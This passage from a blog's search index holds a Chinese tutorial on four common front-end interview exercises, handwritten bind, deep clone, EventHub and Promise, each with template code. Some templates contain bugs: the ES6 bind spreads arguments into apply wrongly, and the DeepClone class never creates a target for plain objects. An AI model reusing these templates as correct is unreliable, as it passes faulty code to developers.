class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 兼容 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兼容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端四大手写</title>
      <link href="/2020/07/23/frontend/interview/qian-duan-si-da-shou-xie/"/>
      <url>/2020/07/23/frontend/interview/qian-duan-si-da-shou-xie/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>要问程序员最心虚的面试题，如果要投票选择，<strong>手撕代码</strong>一定是前三位的。其中在前端领域，以<strong>手写 bind</strong>、<strong>手写深拷贝</strong>、<strong>手写 EventHub</strong>（发布-订阅）、<strong>手写 Promise</strong>最为常见，我将他们称为<strong>四大手写。</strong>本文的目的就是要破除大家对四大手写的恐惧，将从<strong>为什么要会手写</strong>，到每个手写的<strong>关键思路总结</strong>，再到<strong>最终模板</strong>，我都会<strong>毫无保留</strong>地分享给大家。话不多说，让我们开始吧。<br><a name="VqL5S"></a></p><h2 id="为什么要会手写"><a href="#为什么要会手写" class="headerlink" title="为什么要会手写"></a>为什么要会手写</h2><p>面试遇到手写题一脸懵逼的你也许一定想问：网上代码一堆，随便抄一下不香吗，为什么要手写？关于这个问题最直接的回答：为了<strong>区分</strong>厉害的和普通的。但坦白来讲，<strong>会白板实现关键功能的人，实现业务需求的效率一定更高</strong>。<br />为什么这么说？<br />拿手写 Promise 举例来讲，真实的业务场景会遇到大量的 AJAX 异步请求，而且大多是嵌套多层的异步代码。<br />普通前端 A 平时只会最简单的 Promise 用法，遇到多层嵌套的 Promise 就搞不清楚逻辑了，于是开发 1 小时，修 Bug 3 小时，<strong>内卷 996</strong>；<br />高级前端 B 会手写 Promise，对 Promise 的内在逻辑一清二楚，于是开发半小时，修 Bug 15 分钟，完成质量高速度快，深受 PM 小姐姐和测试小哥哥的喜爱，<strong>准点下班绩效高</strong>。<br />再举个 EventHub 的例子，会手写 EventHub 的前端，Vue 里的 $emit、$on 基本就是闭眼写；同理还有 React 里面组件想要调用普通函数（非箭头函数），需要 this.fn.bind(this)，会手写 bind 的前端就更容易举一反三，不会的就只能死记硬背，遇到 Bug 不知所措。。。<br />所以，会“四大手写”是<strong>前端进阶</strong>的必由之路，甚至可以说，<strong>手写关键代码的能力 ≈ 编程能力</strong>。</p><hr><p><a name="sODCV"></a></p><h2 id="手写-bind"><a href="#手写-bind" class="headerlink" title="手写 bind"></a>手写 bind</h2><p>bind 用法不难，一句话解释就是把新的 this 绑定到某个函数 func 上，并返回 func 的一个拷贝。使用方法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.<span class="title function_">bind</span>(thisArg[, arg1[, arg2[, ...argN]]])</span><br></pre></td></tr></table></figure><p><br />那怎么实现呢？我认为手写 bind 可以分为三个境界：</p><ol><li>初级：只用 ES6 新语法</li></ol><ul><li>优点：因为可以使用 const 、… 操作符，代码简洁</li><li>缺点：兼容性稍差</li></ul><ol start="2"><li>中级：使用 ES5 语法</li></ol><ul><li>优点：兼容 IE（其实可以忽略）</li><li>缺点：参数要用 Array.prototype.slice 获取，复杂且不支持 new</li></ul><ol start="3"><li>高级：ES5 + 支持 new</li></ol><ul><li>优点：支持 new</li><li>缺点：最复杂</li></ul><p><a name="P5uSV"></a></p><h3 id="初级-bind"><a href="#初级-bind" class="headerlink" title="初级 bind"></a>初级 bind</h3><p>这种方式的优点是因为可以使用 const 、… 操作符，代码简洁；缺点是不兼容 IE 等一些古老浏览器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初级：ES6 新语法 const/...</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_1</span>(<span class="params">asThis, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> fn = <span class="variable language_">this</span>; <span class="comment">// 这里的 this 就是调用 bind 的函数 func</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(asThis, ...args, ...args2);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="mivQ4"></a></p><h3 id="中级-bind"><a href="#中级-bind" class="headerlink" title="中级 bind"></a>中级 bind</h3><ul><li>优点：兼容 IE</li><li>缺点：参数要用 Array.prototype.slice 取，复杂且不支持 new</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中级：兼容 ES5</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_2</span>(<span class="params">asThis</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> slice = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>;</span><br><span class="line">  <span class="keyword">var</span> args = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;cannot bind non_function&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> args2 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(asThis, args.<span class="title function_">concat</span>(args2));</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Vig5y"></a></p><h3 id="高级-bind"><a href="#高级-bind" class="headerlink" title="高级 bind"></a>高级 bind</h3><ul><li>优点：支持 new</li><li>缺点：最复杂</li></ul><p>写之前，我们先来看一看我们应该如何判断 new，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title function_">fn</span>(args)</span><br></pre></td></tr></table></figure><p>其实<strong>等价于</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> temp = &#123;&#125;</span><br><span class="line">temp.<span class="property">__proto__</span> = fn.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">fn.<span class="title function_">apply</span>(temp, [...args])</span><br><span class="line"><span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><p>核心在第二句：temp.<strong>proto</strong> &#x3D; fn.prototype，有了这个，我们便知道可以用 fn.prototype 是否为对象原型来判断是否为 new 的情况。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高级：支持 new，例如 new (funcA.bind(thisArg, args))</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_3</span>(<span class="params">asThis</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> slice = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>;</span><br><span class="line">  <span class="comment">// 改变数组slice方法的作用域，使 this 指向arguments对象</span></span><br><span class="line">  <span class="comment">// call () 方法的第二个参数表示传递给slice的参数即截取数组的起始位置</span></span><br><span class="line">  <span class="keyword">var</span> args1 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Must accept function&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resultFn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> args2 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(</span><br><span class="line">      resultFn.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(<span class="variable language_">this</span>) ? <span class="variable language_">this</span> : asThis, <span class="comment">// 用来绑定 this</span></span><br><span class="line">      args1.<span class="title function_">concat</span>(args2)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  resultFn.<span class="property"><span class="keyword">prototype</span></span> = fn.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">  <span class="keyword">return</span> resultFn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是前端年年考，年年不会，网上博客又经常误人子弟的“手写深拷贝”。</p><hr><p><a name="vuhlj"></a></p><h2 id="手写深拷贝"><a href="#手写深拷贝" class="headerlink" title="手写深拷贝"></a>手写深拷贝</h2><p>先问这么几个问题，</p><ul><li>首先为什么要深拷贝？不希望数据被修改或者只需要部分修改数据。</li><li>怎么实现深拷贝？简单需求用 JSON 反序列化，复杂需求用递归克隆。</li><li>手写深拷贝的优点？体现扎实的 JS 基础。</li><li>至于缺点以及如何解决稍后再回答<br><a name="IQGQm"></a></li></ul><h3 id="简单需求"><a href="#简单需求" class="headerlink" title="简单需求"></a>简单需求</h3><p>最简单的手写深拷贝就一行，通过 <strong>JSON 反序列化</strong>来实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> B = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(A))</span><br></pre></td></tr></table></figure><p>缺点也是显而易见的，<strong>JSON value 不支持的数据类型，都拷贝不了</strong></p><ol><li>不支持函数</li><li>不支持 undefined（<strong>支持 null</strong>）</li><li>不支持循环引用，比如 a &#x3D; {name: ‘a’}; a.self &#x3D; a; a2 &#x3D; JSON.parse(JSON.stringify(a))</li><li>不支持 Date，会变成 ISO8601 格式的字符串</li><li>不支持正则表达式</li><li>不支持 Symbol</li></ol><p>如何支持这些复杂需求，就需要用到<strong>递归克隆</strong>了。<br><a name="LTgyG"></a></p><h3 id="复杂需求"><a href="#复杂需求" class="headerlink" title="复杂需求"></a>复杂需求</h3><p><strong>核心</strong>有三点：</p><ol><li>递归</li><li>对象分类型讨论</li><li>解决循环引用（环）</li></ol><p>下面给出我的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DeepClone</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cacheList</span> = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cache = <span class="variable language_">this</span>.<span class="title function_">findCache</span>(source);</span><br><span class="line">      <span class="keyword">if</span> (cache) <span class="keyword">return</span> cache; <span class="comment">// 如果找到缓存，直接返回</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> target;</span><br><span class="line">        <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">          target = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Function</span>) &#123;</span><br><span class="line">          target = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> source.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Date</span>) &#123;</span><br><span class="line">          target = <span class="keyword">new</span> <span class="title class_">Date</span>(source);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">RegExp</span>) &#123;</span><br><span class="line">          target = <span class="keyword">new</span> <span class="title class_">RegExp</span>(source.<span class="property">source</span>, source.<span class="property">flags</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">cacheList</span>.<span class="title function_">push</span>([source, target]); <span class="comment">// 把源对象和新对象放进缓存列表</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">          <span class="keyword">if</span> (source.<span class="title function_">hasOwnProperty</span>(key)) &#123; <span class="comment">// 不拷贝原型上的属性，太浪费内存</span></span><br><span class="line">            target[key] = <span class="variable language_">this</span>.<span class="title function_">clone</span>(source[key]); <span class="comment">// 递归克隆</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> source;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">findCache</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">cacheList</span>.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">cacheList</span>[i][<span class="number">0</span>] === source) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">cacheList</span>[i][<span class="number">1</span>]; <span class="comment">// 如果有环，返回对应的新对象</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一句，如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/source-deepClone">我的 GitHub →</a><br />递归克隆看起来很强大，但是完美无缺吗？其实还是有不小的距离：</p><ol><li>对象类型支持不够多（Buffer，Map，Set 等都不支持）</li><li>存在递归爆栈的风险</li></ol><p>如果要解决这些问题，实现一个”完美“的深拷贝，只能求教上百行代码的 <a href="https://link.zhihu.com/?target=https://github.com/lodash/lodash/blob/master/cloneDeep.js">Lodash.cloneDeep()</a> 了 。<br />让我们再引申一下，深拷贝有局限吗？<br><a name="hlf23"></a></p><h2 id="深拷贝的局限"><a href="#深拷贝的局限" class="headerlink" title="深拷贝的局限"></a>深拷贝的局限</h2><p>如果需要对一个复杂对象进行频繁操作，每次都完全深拷贝一次的话性能岂不是太差了，因为大部分场景下都只是更新了这个对象的某几个字段，而其他的字段都不变，对这些不变的字段的拷贝明显是多余的。那么问题来了，浅拷贝不更新，深拷贝性能差，怎么办？<br />这里推荐 3 个可以实现”部分“深拷贝的库：</p><ol><li><a href="https://link.zhihu.com/?target=https://immutable-js.github.io/immutable-js/">Immutable.js</a> Immutable.js 会把对象所有的 key 进行 hash 映射，将得到的 hash 值转化为二进制，从后向前每 5 位进行分割后再转化为 Trie 树。Trie 树利用这些 hash 值的公共前缀来减少查询时间，最大限度地减少无谓 key 的比较。关于 Trie 树（字典树）的介绍，可以看我的博客<a href="https://zhuanlan.zhihu.com/p/136103651">算法基础 06-字典树、并查集、高级搜索、红黑树、AVL 树</a></li><li><a href="https://link.zhihu.com/?target=https://github.com/rtfeldman/seamless-immutable">seamless-immutable</a>，如果数据量不大但想用这种类似 updateIn 便利的语法的话可以用 seamless-immutable。这个库就没有上面的 Trie 树这些幺蛾子了，就是为其扩展了 updateIn、merge 等 9 个方法的普通简单对象，利用 Object.freeze 冻结对象本身改动, 每次修改返回副本。感觉像是阉割版，性能不及 Immutable.js，但在部分场景下也是适用的。</li><li><a href="https://link.zhihu.com/?target=https://github.com/immerjs/immer">Immer.js</a>，通过用来数据劫持的 Proxy 实现：对原始数据中每个访问到的节点都创建一个 Proxy，修改节点时修改副本而不操作原数据，最后返回到对象由未修改的部分和已修改的副本组成。（这不就是 Vue3 数据响应式原理嘛）<br><a name="ZzcKr"></a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看完这一段，你现在能回答怎么实现深拷贝了吗？概括成一句就是：<strong>简单需求用 JSON 反序列化，复杂需求用递归克隆</strong>。<br />对于递归克隆的深拷贝，核心有三点：</p><ol><li><strong>对象分类</strong></li><li><strong>递归</strong></li><li>用<strong>缓存</strong>对付<strong>环</strong></li></ol><hr><p><a name="QMocX"></a></p><h2 id="手写-EventHub（发布-订阅）"><a href="#手写-EventHub（发布-订阅）" class="headerlink" title="手写 EventHub（发布-订阅）"></a>手写 EventHub（发布-订阅）</h2><p>核心思路是：</p><ol><li>使用一个对象作为<strong>缓存</strong></li><li>on 负责把方法<strong>发布</strong>到缓存的 EventName 对应的数组</li><li>emit 负责遍历触发<strong>（订阅）</strong> EventName 下的方法数组</li><li>off <strong>找</strong>方法的<strong>索引</strong>，并删除</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EventHub</span> &#123;</span><br><span class="line">  cache = &#123;&#125;;</span><br><span class="line">  <span class="title function_">on</span>(<span class="params">eventName, fn</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName] = <span class="variable language_">this</span>.<span class="property">cache</span>[eventName] || [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">push</span>(fn);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">eventName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">forEach</span>(<span class="function">(<span class="params">fn</span>) =&gt;</span> <span class="title function_">fn</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">off</span>(<span class="params">eventName, fn</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">cache</span>[eventName], fn); <span class="comment">// 这里用 this.cache[eventName].indexOf(fn) 完全可以，封装成函数是为了向下兼容</span></span><br><span class="line">    <span class="keyword">if</span> (index === -<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cache</span>[eventName].<span class="title function_">splice</span>(index, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 兼容 IE 8 的 indexOf</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">indexOf</span>(<span class="params">arr, item</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (arr === <span class="literal">undefined</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> index = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] === item) &#123;</span><br><span class="line">      index = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果您想看详细的测试与运行结果，请参见 <a href="https://link.zhihu.com/?target=https://github.com/venaissance/ts-source-EventHub">我的 GitHub →</a></p><hr><p><a name="kGhQd"></a></p><h2 id="手写-Promise"><a href="#手写-Promise" class="headerlink" title="手写 Promise"></a>手写 Promise</h2><p>无疑是要求最高的，如果要硬按照 Promises&#x2F;A+ 规范来写，可能至少要 2-3 个小时，400+行代码，这种情况是几乎不可能出现在面试中。所以我们只需要完成一个<strong>差不多</strong>的版本，保留最核心的功能。<br />核心功能：</p><ul><li>new Promise(fn) 其中 fn 只能为函数，且要<strong>立即执行</strong></li><li>promise.then(success, fail)中的 success 是函数，且会在 resolve 被调用的时候执行，fail 同理</li></ul><p>实现思路：</p><ol><li>then(succeed, fail) 先把成功失败回调放到一个回调数组 callbacks[] 上</li><li>resolve() 和 reject() 遍历 callbacks</li><li>resolve() 读取成功回调 &#x2F; reject() 读取失败回调，并异步执行 callbacks 里面的成功和失败回调（放到本轮的微任务队列中）</li></ol><p>下面分享我自己根据上述需求及思路实现的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Promise2</span> &#123;</span><br><span class="line">  state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">  callbacks = [];</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;must pass function&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fn</span>(<span class="variable language_">this</span>.<span class="property">resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="variable language_">this</span>.<span class="property">reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="params">result</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&quot;fulfilled&quot;</span>;</span><br><span class="line">    <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">handle</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> handle[<span class="number">0</span>] === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          handle[<span class="number">0</span>].<span class="title function_">call</span>(<span class="literal">undefined</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">    <span class="title function_">nextTick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">handle</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> handle[<span class="number">1</span>] === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">          handle[<span class="number">1</span>].<span class="title function_">call</span>(<span class="literal">undefined</span>, reason);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">then</span>(<span class="params">succeed, fail</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> handle = [];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> succeed === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      handle[<span class="number">0</span>] = succeed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fail === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      handle[<span class="number">1</span>] = fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(handle);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nextTick</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (process !== <span class="literal">undefined</span> &amp;&amp; <span class="keyword">typeof</span> process.<span class="property">nextTick</span> === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> process.<span class="title function_">nextTick</span>(fn);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 